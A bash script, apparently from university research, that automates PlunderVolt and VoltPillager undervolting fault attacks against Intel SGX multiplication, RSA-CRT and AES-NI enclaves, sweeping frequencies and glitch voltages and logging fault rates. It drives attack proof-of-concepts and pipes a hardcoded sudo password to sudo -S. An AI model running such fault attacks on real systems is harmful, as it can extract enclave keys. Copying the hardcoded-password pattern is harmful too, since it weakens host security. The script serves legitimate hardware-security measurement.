#!/bin/bash
#Autotest VoltPillager and PlunderVolt attack 
#Author: Marek Lorinc
#Date: 09.05.2022

#Paths to attacks on tested PC
#PATH_TO_ATTACK=/home/fit/plundervolt
#PATH_TO_ATTACK=/home/fit/voltpill/voltpillager/poc

#Check if script were executed with 2 parameters
if [ "$#" -ne 2 ]; then
    echo "Illegal number of parameters"
    echo "2 parameters must be inserted"
    echo "1-6 and Path"
    echo "1-6: type of attack:"
    echo "1 - PlunderVolt Fault multiplication"
    echo "2 - PlunderVolt Fault RSA"
    echo "3 - PlunderVolt Fault AES"
    echo "4 - VoltPillager Fault multiplication"
    echo "5 - VoltPillager Fault RSA"
    echo "6 - VoltPillager Fault AES"
    echo "Path: path to PlunderVolt or VoltPillager attack"
    echo "PlunderVolt path should include: https://github.com/KitMurdock/plundervolt"
    echo "VoltPillager path should include: https://github.com/zt-chen/voltpillager/tree/master/poc"
    echo "example run:" $0 "1 /home/fit/voltpill/voltpillager/poc"
    exit 1
fi

PATH_TO_ATTACK=$2

#Path to sgx-step library (only for plundervolt attack and should be in plundevol attack directory)
LIBSGXSTEP_DIR=$PATH_TO_ATTACK/sgx-step
LIBSGXSTEP=$LIBSGXSTEP_DIR/libsgxstep
URTS_LIB_PATH=$LIBSGXSTEP_DIR/linux-sgx/psw/urts/linux

#Frequency of voltpillager attack
freq_VP_attack="2.0"
#Basic voltage on target frequency of voltpillager attack
basic_voltage_VP_mul="0.859"
#Maximum iterations of attack
iterations=10000
#Password of computer
password="123456"

#Create directory for results
mkdir -p $PATH_TO_ATTACK/results
cd $PATH_TO_ATTACK/results

#Create directory for target attack and activate SGX for RSA and AES attack
case $1 in
1)
    mkdir -p mul
    cd mul
    path_files=$PATH_TO_ATTACK/results/mul
    ;;
2)
    cd $LIBSGXSTEP_DIR/kernel
    echo $password | sudo -S make clean load
    source /opt/intel/sgxsdk/environment
    cd ../../results
    mkdir -p rsa
    cd rsa
    path_files=$PATH_TO_ATTACK/results/rsa
    ;;
3)
    cd $LIBSGXSTEP_DIR/kernel
    echo $password | sudo -S make clean load
    source /opt/intel/sgxsdk/environment
    cd ../../results
    mkdir -p aes
    cd aes
    path_files=$PATH_TO_ATTACK/results/aes
    ;;
4)
    mkdir -p mul
    cd mul
    path_files=$PATH_TO_ATTACK/results/mul
    ;;
5)
    source /opt/intel/sgxsdk/environment
    mkdir -p rsa
    cd rsa
    path_files=$PATH_TO_ATTACK/results/rsa
    ;;
6)
    source /opt/intel/sgxsdk/environment
    mkdir -p aes
    cd aes
    path_files=$PATH_TO_ATTACK/results/aes
    ;;
*)
    echo "Invalid input"
    echo "1 - PlunderVolt Fault multiplication"
    echo "2 - PlunderVolt Fault RSA"
    echo "3 - PlunderVolt Fault AES"
    echo "4 - VoltPillager Fault multiplication"
    echo "5 - VoltPillager Fault RSA"
    echo "6 - VoltPillager Fault AES"
    exit 1
    ;;
esac

#For PlunderVolt attack: max_freq_delay set to maximum frequency 30 => 3.0GHz and start freq to 10 => 1.0GHz and step 0.1GHz
#For VoltPillager attack: max_freq_delay set to maximum delay 100 => 100us and start delay to 5 => 5 and step 5us
if [ $1 -le 3 ]; then
    max_file=10
    max_freq_delay=30
    step_file=1
else
    max_file=5
    max_freq_delay=100
    step_file=5
fi

#Find last frequency/delay set
files_arr=($(ls -p | grep -v /))
for n in "${files_arr[@]}"; do
    ((n > max_file)) && max_file=$n
done

#Do the attack until maximum freq/delay is not achieved
while [ $max_file -le $max_freq_delay ]; do
    #Create file for current frequency if doesnt exist
    if [ -e $path_files/$max_file ]; then
        echo "File $max_file already exists!"
    else
        touch $path_files/$max_file
        echo "SUCCESS=0" >>$path_files/$max_file
        echo "FAULT=0" >>$path_files/$max_file
    fi

    #Convert current filename to frequency for plundervolt attack 
    if [ $1 -le 3 ]; then
        freq=${max_file:0:1}.${max_file:1:1}
    else
        freq=$freq_VP_attack
    fi

    echo "$freq"
    #Set frequency
    echo $password | sudo -S modprobe msr
    echo $password | sudo -S cpupower -c all frequency-set -u "$freq"GHz
    echo $password | sudo -S cpupower -c all frequency-set -d "$freq"GHz
    # Repeated because sometimes it doesn't work
    echo $password | sudo -S cpupower -c all frequency-set -u "$freq"GHz
    echo $password | sudo -S cpupower -c all frequency-set -d "$freq"GHz

    #Create file for saving output from attack
    touch $path_files/fault_output
    
    #Read how many measures (SUCCESS+FAULT) were performed on current freq/delay
    exec 6<$path_files/$max_file
    read line1 <&6
    read line2 <&6
    succ="${line1//[^0-9]/}"
    fault="${line2//[^0-9]/}"
    total=$(($succ + $fault))
    echo $total
    #Increase number of faults before attack, because when PC freezes, it is not possible to increase
    sed -i '2s/.*/FAULT='$(($fault + 1))'/' $path_files/$max_file
    exec 6<&-
    lines=0
    sleep 5
    #If total measures is more than 50, move to next frequency/delay
    while [ $total -le 50 ]; do
        case $1 in
        1)  #PlunderVolt fault multiplication with undervolting from 100mv to 280mv
            echo $password | sudo -S $PATH_TO_ATTACK/faulting_multiplications/operation -t 4 -i $iterations -z max -x max -1 0xFFFFFFFFFF -2 0xFFFFFFFFFF -s -100 -e 0 -X 180 >$path_files/fault_output
            lines=12
            ;;
        2)  #PlunderVolt RSA decryption fault
            undervolt_start=100
            is_faulty="meh - all fine"
            lines=3
            cd $PATH_TO_ATTACK/sgx_crt_rsa
            #Do the attack by decreasing current voltage(undervolt_start). If attack isnt successful, undervolting is increased by 1mV
            while [ "$is_faulty" = "meh - all fine" ]; do
                echo $password | sudo -S ./app $iterations -$undervolt_start >$path_files/fault_output
                is_faulty=$(tail -2 "$path_files/fault_output" | head -1)
                echo $is_faulty
                undervolt_start=$(($undervolt_start + 1))
                sleep 0.5
            done

            ;;
        3)  #PlunderVolt AES encryption fault
            undervolt_start=100
            is_faulty=""
            lines=15
            cd $PATH_TO_ATTACK/sgx_aes_ni

            #Do the attack by decreasing current voltage(undervolt_start). If attack isnt successful, undervolting is increased by 1mV
            while [[ "$is_faulty" != *"[Enclave] dec:"* ]]; do
                echo $password | sudo -S ./app $iterations -$undervolt_start >$path_files/fault_output
                is_faulty=$(tail -1 "$path_files/fault_output")
                echo $is_faulty
                undervolt_start=$(($undervolt_start + 1))
                sleep 1
            done
            ;;
        4)  #VoltPillager fault multiplication
            undervolt_start=680
            is_faulty="resp:MUL"
            lines=12

            #Do the attack by voltage of undervolt(undervolt_start). If attack isnt successful, voltage attack is decreased by 1mV
            while [ "$is_faulty" == "resp:MUL" ]; do
                echo $password | sudo -S $PATH_TO_ATTACK/mul/glitch_controller -b 115200 -p /dev/ttyACM0 -d 1000 --retries 1 --num_p 10 --pre_volt $basic_voltage_VP_mul --pre_delay $max --glitch_voltage 0.$undervolt_start --rst_volt $basic_voltage_VP_mul --rst_delay "-30" --target_name mul --iter $iterations --calc_thread_num 4 --calc_op1 0xae84185e8 --calc_op2 0x70d94ea9 -g >$path_files/fault_output
                is_faulty=$(tail -1 "$path_files/fault_output")
                echo $is_faulty
                undervolt_start=$(($undervolt_start - 1))
                sleep 0.5
            done
            ;;
        5)  #VoltPillager RSA decryption fault
            undervolt_start=630
            is_faulty="meh - all fine"
            lines=3
            cd $PATH_TO_ATTACK/sgx-crt-rsa

            #Do the attack on current undervolt. If attack isnt successful, voltage attack is decreased by 1mV
            while [ "$is_faulty" == "meh - all fine" ]; do
                echo $password | sudo -S ./app $iterations $max $undervolt_start >$path_files/fault_output
                echo $undervolt_start
                is_faulty=$(tail -2 "$path_files/fault_output" | head -1)
                echo $is_faulty
                undervolt_start=$(($undervolt_start - 1))
                sleep 0.5
            done

            ;;
        6)  #VoltPillager AES encryption fault
            undervolt_start=545
            is_faulty=""
            lines=17
            cd $PATH_TO_ATTACK/sgx-aes-ni

            #Do the attack on current undervolt. If attack isnt successful, voltage attack is decreased by 1mV
            while [[ "$is_faulty" != *"[Enclave] dec:"* ]]; do
                echo $password | sudo -S ./app $iterations $max $undervolt_start >$path_files/fault_output
                echo $undervolt_start
                sleep 0.5
                is_faulty=$(tail -3 "$path_files/fault_output" | head -1)
                echo $is_faulty
                undervolt_start=$(($undervolt_start - 1))
            done
            ;;
        esac

        #Increase number of success, if attack is successful
        #Condition isnt required, because, if attack isnt successful, PC freezes in attack command and never gets here.
        succ=$(($succ + 1))
        sed -i '1s/.*/SUCCESS='$succ'/' $path_files/$max_file
        total=$(($total + 1))
        tail -$lines $path_files/fault_output >>$path_files/$max_file
    done
    #Last attack were successful and PC doesnt freeze, so number of faults must be decreased by 1 
    sed -i '2s/.*/FAULT='$fault'/' $path_files/$max_file
    #Move to next frequency/delay
    max_file=$(($max_file + $step_file))
done
